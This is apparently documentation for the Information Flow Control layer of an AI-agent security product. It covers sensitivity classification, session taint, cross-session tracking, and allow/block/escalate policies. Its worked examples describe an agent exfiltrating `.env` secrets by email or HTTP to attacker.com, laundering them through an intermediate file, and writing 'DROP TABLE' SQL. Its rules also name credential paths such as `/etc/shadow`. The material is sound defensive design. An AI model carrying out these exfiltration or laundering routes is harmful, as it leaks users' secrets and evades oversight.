# Information Flow Control

IFC prevents sensitive data from flowing to destinations where it shouldn't go. When the agent reads a credential file, that data is tagged with a sensitivity level. When a subsequent action attempts to send that data via email or HTTP, IFC blocks the flow — even if Shield approved the action.

IFC operates at three levels:

- **Per-action classification** — the file path of each action is classified by policy rules and the activity table. The decision matrix determines whether that sensitivity level can flow to the action's sink category.
- **Session taint** — the highest sensitivity seen in a session propagates to all subsequent actions. An agent that reads `.env` (critical) cannot send email for the rest of the session, even if the email action itself has no classified path.
- **Content sensitivity tags** — tool results carry sensitivity metadata through the LLM turn. When the agent proposes a new action using content from a tagged result, the tag is inherited.

## How It Works

### 1. Classify

When the agent proposes an action, IFC classifies the data source (file path) using two sources, taking the higher sensitivity:

1. **Policy source rules** — YAML pattern matching on file paths. First matching rule wins, evaluated top to bottom.
2. **Activity table** — a persistent SQLite table that tracks files the agent has previously written with classified data. If the agent wrote `.env` content to `notes.txt` in a prior session, `notes.txt` inherits the classification.

### 2. Record taint

If the classification is non-nil, the session's taint level is upgraded to match. Session taint only goes up, never down — once an agent has seen critical data, the session stays critical.

### 3. Apply taint

For actions that have no direct path classification (like `send_email` or `http_request`), session taint fills in as the classification. This is what closes the gap: reading `.env` taints the session, and a subsequent email is checked against that taint.

Content sensitivity tags provide an additional propagation path. When a tool result carries a sensitivity tag, and the agent proposes a new action using that content, the tag is inherited by the new action's classification.

### 4. Decide

IFC looks up the action type in the policy's sink categories, then checks the decision matrix: for this sensitivity level x this sink category, is the decision `allow`, `block`, or `escalate`?

### 5. Enforce or audit

In `enforce` mode, blocks are real — the action is stopped and logged. In `audit` mode, blocks are logged but the action proceeds. Escalations route to Shield Tier 3 (human approval).

### 6. Record activity

After a successful file write (`write_file`, `copy_file`, `move_file`) with classified data, IFC records the destination path in the activity table. Future reads of that file — in any session — inherit the classification.

## Schema

IFC policies live in `security/ifc/` as YAML files. The schema has five sections:

### mode

```yaml
mode: enforce    # enforce | audit
```

- `enforce` — blocking decisions take effect
- `audit` — log what would be blocked, never block (shadow mode for policy preview)

The `security.override_mode` field in `config.yaml` overrides this per-workspace.

### sources

Ordered list of classification rules. First match wins, evaluated top to bottom. Each rule has a name, a sensitivity level, and a match block.

```yaml
sources:
  - name: patient_records
    sensitivity: restricted
    match:
      basename_contains: [patient, diagnosis, prescription, medical]

  - name: env_files
    sensitivity: critical
    match:
      basename_in: [".env", ".env.local", ".env.production"]
      basename_not_in: [".env.example", ".env.template"]

  - name: default
    sensitivity: public
    match: {}    # empty match = catch-all
```

**Match criteria** (all specified criteria must match):

| Field | Matches on | Example |
|---|---|---|
| `basename_in` | Exact basename | `[".env", "credentials.json"]` |
| `basename_not_in` | Exclusion (overrides `basename_in`) | `[".env.example"]` |
| `basename_suffix_in` | Basename suffix | `[".pem", ".key", ".pfx"]` |
| `basename_contains` | Substring in basename | `[patient, invoice, salary]` |
| `path_contains` | Substring in full path | `["/.ssh/", "/.aws/"]` |
| `path_in` | Exact full path | `["/etc/shadow"]` |

### Sensitivity levels

| Level | Value | Meaning |
|---|---|---|
| `public` | 0 | No restrictions. Regular source code, documentation. |
| `internal` | 1 | Reserved for future taint propagation. |
| `confidential` | 2 | Agent configuration files (config.yaml, SOUL.md). |
| `restricted` | 3 | Financial, medical, or legal documents. |
| `critical` | 4 | Credentials, SSH keys, cloud configs. |

### sinks

Maps action types to named categories. Each action type belongs to exactly one category.

```yaml
sinks:
  external:
    - http_request
    - send_email
    - send_message
  exec:
    - execute_command
  memory:
    - memory_write
  workspace_write:
    - write_file
    - create_directory
    - move_file
    - copy_file
    - delete_file
  workspace_read:
    - read_file
    - list_directory
    - search_files
    - memory_search
    - grep_files
```

The `memory` category is separate from `workspace_write` because memory persistence has different security implications — data written to memory survives across sessions and influences future agent behavior, making it a distinct exfiltration vector.

**Unknown action types** (MCP tools, future built-ins) that don't appear in any sink category are always allowed. This denylist design ensures new tools work without policy updates.

### memory_block_levels

Controls which sensitivity levels block memory writes, independent of the rules matrix:

```yaml
memory_block_levels: [critical, restricted]
```

When the session has seen data at one of these levels, `memory_write` is blocked regardless of the `memory` row in the rules matrix. This provides a simple override for users who don't want to edit the full rules matrix.

**Precedence:** IFC policy file > `config.yaml` (`security.memory_block_levels`) > built-in default `[critical, restricted]`.

This can also be set in `config.yaml` for users who prefer not to edit the IFC policy directly:

```yaml
security:
  ifc_policy: security/ifc/default.yaml
  memory_block_levels:
    - critical
    - restricted
```

### rules

The decision matrix. For each sensitivity level x sink category: `allow`, `block`, or `escalate`.

```yaml
rules:
  public:
    external: allow
    exec: allow
    memory: allow
    workspace_write: allow
    workspace_read: allow
  confidential:
    external: block
    exec: allow
    memory: allow
    workspace_write: allow
    workspace_read: allow
  restricted:
    external: block
    exec: escalate
    memory: block
    workspace_write: escalate
    workspace_read: allow
  critical:
    external: block
    exec: block
    memory: block
    workspace_write: block
    workspace_read: block
```

`escalate` routes the action to Shield Tier 2 (LLM evaluation) and potentially Tier 3 (human approval).

## Session Taint

Session taint is the mechanism that connects a classified read to a subsequent unclassified action. Without it, `send_email` would always pass IFC because email actions have no file path to classify.

### How taint propagates

1. Agent proposes `read_file(/home/user/.env)` — IFC classifies as **critical**
2. Session taint is upgraded to **critical**
3. Agent proposes `send_email(to: team@company.com, body: ...)` — no file path, no direct classification
4. Session taint (**critical**) is applied as the classification
5. `Decide(critical, send_email)` → external sink → **block**

### Taint lifetime

- Taint is **in-memory only** — it does not persist to disk
- Taint only goes **up**, never down within a session
- Taint is cleared when the session ends or the engine restarts
- Each session has independent taint — reading `.env` in session A does not affect session B

### Sub-agent taint propagation

When a sub-agent reads classified data, its taint propagates back to the parent session. A sub-agent cannot be used to launder data past IFC.

## Activity Table

The activity table provides **cross-session classification persistence**. When the agent writes classified data to a new file, the destination inherits the classification. Future reads of that file — in any session — are classified from the activity table.

### What gets tracked

Only explicit file write operations are tracked:

- `write_file` — the primary write action
- `copy_file` — copies inherit the source classification
- `move_file` — the destination inherits the source classification

These are **not** tracked:

- `execute_command` — parsing shell command output paths is fragile and unreliable. Shell execution is gated by session taint and the IFC rules matrix instead.
- `create_directory` — directories don't carry data
- `memory_write` — handled separately by the memory block mechanism

### Classification rules

- The **higher sensitivity wins** — if a file is written with confidential data and later with critical data, the path stays critical
- Classifications **never downgrade** — writing public data to a critical-classified file does not remove the classification
- The policy's own classification takes precedence over the activity table when the policy assigns a higher level

### Managing the activity table

The activity table can grow without bounds as the agent writes to more files. Two CLI commands manage it:

```bash
# List all tracked paths with their classifications
openparallax ifc list

# Remove entries for files that no longer exist on disk
openparallax ifc sweep
```

`ifc sweep` walks every path in the activity table and removes entries where the file has been deleted. This is the explicit consent action — delete the file, run sweep, and the classification is released. Sweep events are logged in the audit chain.

## Content Sensitivity Tags

Content tags provide **within-turn taint propagation** through the LLM. When a tool result contains classified data, the result carries a sensitivity tag in the gRPC protocol. The agent tracks the highest tag seen across tool results in the current message, and includes it as `inherited_sensitivity` on the next tool proposal.

This closes a subtle gap: session taint catches cross-action flows, but content tags catch the case where the LLM reads classified data and immediately proposes an action using that content in the same turn, before the engine has a chance to record session taint.

## Worked Examples

### Example 1: Reading credentials, then trying to email them

A financial analyst asks the agent to "read the API keys from `.env` and email them to the team."

1. Agent proposes `read_file(.env)` — IFC classifies `.env` as **critical** (source rule: `env_files`). Session taint → critical.
2. Agent proposes `send_email(to: team@company.com, ...)` — no file path, but session taint is **critical**.
3. `Decide(critical, send_email)` → external sink → **block**. The email never sends.

### Example 2: Cross-session data laundering via intermediate file

An attacker tries to bypass IFC by writing credentials to an innocuous file, then reading it in a new session.

1. **Session 1:** Agent reads `.env` (critical), writes a summary to `notes.txt`.
2. The activity table records `notes.txt` with sensitivity **critical** (inherited from `.env`).
3. **Session 2:** Agent reads `notes.txt` — classified as **critical** from the activity table, not just the policy.
4. Agent proposes `http_request(url: attacker.com, body: ...)` — session taint is **critical** → **block**.

Without the activity table, `notes.txt` would be classified as **public** in session 2 and the exfiltration would succeed.

### Example 3: Memory write blocked after reading credentials

The agent reads a config file with API keys and tries to save a summary to memory.

1. Agent reads `config.yaml` — classified as **confidential** (source rule: `workspace_config`). Session taint → confidential.
2. Agent proposes `memory_write(key: "project-config", content: ...)`.
3. `memory_block_levels` includes `[critical, restricted]` — confidential is not in the list.
4. `Decide(confidential, memory_write)` → memory sink → **allow** (in the default preset).

With the **strict** preset, confidential → memory → **escalate** (requires human approval).

If the agent had read `.env` (critical) instead, the memory write would be **blocked** by `memory_block_levels`.

### Example 4: Writing a test file with destructive SQL

A developer asks the agent to write a database test helper.

1. Agent proposes `write_file(testhelpers/db.go, "... DROP TABLE users ...")`.
2. IFC classifies `testhelpers/db.go` as **public** (no source rule matches the path). No activity table entry exists.
3. Public → workspace_write → **allow**. The file is written.

IFC classifies by path, not payload. Content scanning for destructive patterns is Shield's domain (Tier 1 heuristics, Tier 2 LLM evaluation).

## Presets

Three IFC policy presets ship with every workspace:

### default.yaml

Balanced. Blocks credentials from external sinks. Allows workspace reads, writes, and memory for most levels. Critical data is hard-blocked everywhere.

| Level | external | exec | memory | workspace_write | workspace_read |
|---|---|---|---|---|---|
| public | allow | allow | allow | allow | allow |
| internal | block | allow | allow | allow | allow |
| confidential | block | allow | allow | allow | allow |
| restricted | block | escalate | block | escalate | allow |
| critical | block | block | block | block | block |

Memory block levels: `[critical, restricted]`

### permissive.yaml

Only critical data is restricted. Everything else flows freely. For trusted single-user workstations where productivity outweighs compartmentalization.

| Level | external | exec | memory | workspace_write | workspace_read |
|---|---|---|---|---|---|
| public | allow | allow | allow | allow | allow |
| internal | allow | allow | allow | allow | allow |
| confidential | allow | allow | allow | allow | allow |
| restricted | allow | allow | allow | allow | allow |
| critical | block | block | block | block | block |

Memory block levels: `[critical]`

### strict.yaml

Maximum compartmentalization. Confidential data requires human approval to write. Restricted data is hard-blocked from writes, exec, and memory. For regulated environments handling sensitive data.

| Level | external | exec | memory | workspace_write | workspace_read |
|---|---|---|---|---|---|
| public | allow | allow | allow | allow | allow |
| internal | block | allow | allow | allow | allow |
| confidential | block | escalate | escalate | escalate | allow |
| restricted | block | block | block | block | escalate |
| critical | block | block | block | block | block |

Memory block levels: `[critical, restricted, confidential]`

## Custom Policies

Copy a preset and modify it:

```bash
cp security/ifc/default.yaml security/ifc/custom.yaml
```

Edit `config.yaml`:
```yaml
security:
  ifc_policy: security/ifc/custom.yaml
```

Common customizations:

**Add a project-specific sensitive path:**
```yaml
sources:
  - name: client_data
    sensitivity: restricted
    match:
      path_contains: ["/client-records/", "/contracts/"]
  # ... rest of sources
```

**Relax restrictions for a workspace you trust:**
```yaml
rules:
  restricted:
    external: block
    exec: allow           # was: escalate
    memory: allow          # was: block
    workspace_write: allow # was: escalate
    workspace_read: allow
```

**Allow memory writes for all sensitivity levels:**
```yaml
memory_block_levels: []    # empty = allow all memory writes
```

**Block memory writes at more levels:**
```yaml
memory_block_levels: [critical, restricted, confidential]
```

**Preview changes with audit mode:**
```yaml
mode: audit    # log but don't block
```

Or in `config.yaml` without touching the policy file:
```yaml
security:
  override_mode: audit
```

## CLI Commands

### `openparallax ifc list`

List all paths tracked in the activity table with their sensitivity levels and source paths.

```bash
openparallax ifc list
```

Example output:
```
IFC-tracked paths (3):

  critical      /home/user/project/notes.txt
                sourced from /home/user/project/.env (2026-04-14 10:30:00)
  restricted    /home/user/project/summary.md
                sourced from /home/user/docs/invoice-2024.pdf (2026-04-14 11:15:00)
  confidential  /home/user/project/config-backup.txt
                sourced from /home/user/project/config.yaml (2026-04-14 09:00:00)
```

### `openparallax ifc sweep`

Remove activity table entries for files that no longer exist on disk. Run this after deleting sensitive files to release their classifications.

```bash
openparallax ifc sweep
```

Example output:
```
Removed 2 stale entries:
  /home/user/project/notes.txt (was: critical, tagged 2026-04-14 10:30:00)
  /home/user/project/old-report.md (was: restricted, tagged 2026-04-13 08:00:00)
```

Sweep events are recorded in the audit chain as `IFCSweep` entries.

## Related Documentation

- [Security Architecture](index.md) — how IFC fits into the full defense map
- [Action Validation](action-validation.md) — IFC as part of the validation pipeline
- [Non-Negotiable Defenses](non-negotiable.md) — the IFC *subsystem* is non-negotiable; the *policy* is tunable
- [Hardening Guide](hardening.md) — which preset to use when
- [Threat Model](threat-model.md) — OWASP/MITRE mapping for IFC-addressed threats
- [Configuration Reference](/reference/config) — `security.ifc_policy` and `security.memory_block_levels`
- [CLI Commands](/guide/cli) — `openparallax ifc list` and `openparallax ifc sweep`
